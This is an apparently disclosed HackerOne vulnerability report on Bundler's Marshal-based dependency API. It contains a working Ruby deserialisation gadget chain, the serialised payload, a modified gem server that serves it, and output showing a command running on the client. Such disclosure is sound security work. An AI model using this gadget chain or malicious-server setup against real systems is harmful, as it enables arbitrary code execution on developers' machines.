# Bundler's RCE with response using Marshal

## Report Details
- **Report ID**: 1119120
- **URL**: https://hackerone.com/reports/1119120
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2021-03-07T07:02:49.576Z
- **Disclosed**: 2024-03-12T02:56:05.631Z

## Reporter
- **Username**: ooooooo_q
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rubygems

## Vulnerability Information
In `GET /api/v1/dependencies`, which Bundler uses to check dependencies, the response is `Marshal.dump` instead of `JSON`.

https://github.com/rubygems/rubygems.org/blob/a6f78a01598592083850f15e262bbc09a85b0a70/app/controllers/api/v1/dependencies_controller.rb#L12

```ruby
    respond_to do |format|
      format.json { render json: deps }
      format.marshal { render plain: Marshal.dump(deps) }
    end
```

According to the [Universal Deserialisation Gadget for Ruby 2.x-3.x](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html) article, Marshal.load can be RCE.
Therefore, RCE is possible for the client that receives the specially crafted response.


### Poc

#### Prepare attack code

Prepare code to run `date`

```ruby
# Universal Deserialisation Gadget for Ruby 2.x-3.x
# https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html

# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "date") # for run `date`

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts payload.inspect
```

```
❯ ruby create_rce.rb
"\x04\b[\bc\x15Gem::SpecFetcherc\x13Gem::InstallerU:\x15Gem::Requirement[\x06o:\x1CGem::Package::TarReader\x06:\b@ioo:\x14Net::BufferedIO\a;\ao:#Gem::Package::TarReader::Entry\a:\n@readi\x00:\f@headerI\"\baaa\x06:\x06ET:\x12@debug_outputo:\x16Net::WriteAdapter\a:\f@socketo:\x14Gem::RequestSet\a:\n@setso;\x0E\a;\x0Fm\vKernel:\x0F@method_id:\vsystem:\r@git_setI\"\tdate\x06;\fT;\x12:\fresolve"
```

#### Prepare evil server

Prepare a server to work on the response.
I created it based on [geminabox](https://github.com/geminabox/geminabox).

```ruby
# geminabox/geminabox/lib/geminabox/server.rb
    get '/api/v1/dependencies' do
      attack = "\x04\b[\bc\x15Gem::SpecFetcherc\x13Gem::InstallerU:\x15Gem::Requirement[\x06o:\x1CGem::Package::TarReader\x06:\b@ioo:\x14Net::BufferedIO\a;\ao:#Gem::Package::TarReader::Entry\a:\n@readi\x00:\f@headerI\"\baaa\x06:\x06ET:\x12@debug_outputo:\x16Net::WriteAdapter\a:\f@socketo:\x14Gem::RequestSet\a:\n@setso;\x0E\a;\x0Fm\vKernel:\x0F@method_id:\vsystem:\r@git_setI\"\tdate\x06;\fT;\x12:\fresolve"
      query_gems.any? ? attack : 200
    end
```

```
❯ RUBYGEMS_PROXY=true rackup
Puma starting in single mode...
* Puma version: 5.2.2 (ruby 2.7.1-p83) ("Fettisdagsbulle")
*  Min threads: 0
*  Max threads: 5
*  Environment: development
*          PID: 22469
* Listening on http://127.0.0.1:9292
* Listening on http://[::1]:9292
```

### Use evil sever

```
❯ bundle -v
Bundler version 2.2.13

❯ bundle init

# Use evil server for source
❯ cat Gemfile
# frozen_string_literal: true

# source "https://rubygems.org"
source "http://127.0.0.1:9292"

gem "json"
```

```
# `date` runs on the client
❯ bundle install
Fetching gem metadata from http://127.0.0.1:9292/.sh: reading: command not found
2021年 3月 7日 日曜日 15時44分43秒 JST

Retrying dependency api due to error (2/4): Bundler::MarshalError TypeError: no implicit conversion of nil into String
sh: reading: command not found
2021年 3月 7日 日曜日 15時44分43秒 JST

Retrying dependency api due to error (3/4): Bundler::MarshalError TypeError: no implicit conversion of nil into String
sh: reading: command not found
2021年 3月 7日 日曜日 15時44分44秒 JST

Retrying dependency api due to error (4/4): Bundler::MarshalError TypeError: no implicit conversion of nil into String
sh: reading: command not found
2021年 3月 7日 日曜日 15時44分44秒 JST
```

## Impact

Of course, there is a danger in specifying an untrusted `source` and in the possibility of a man-in-the-middle attack. This endpoint using marshal increases that risk.

## Attachments
No attachments
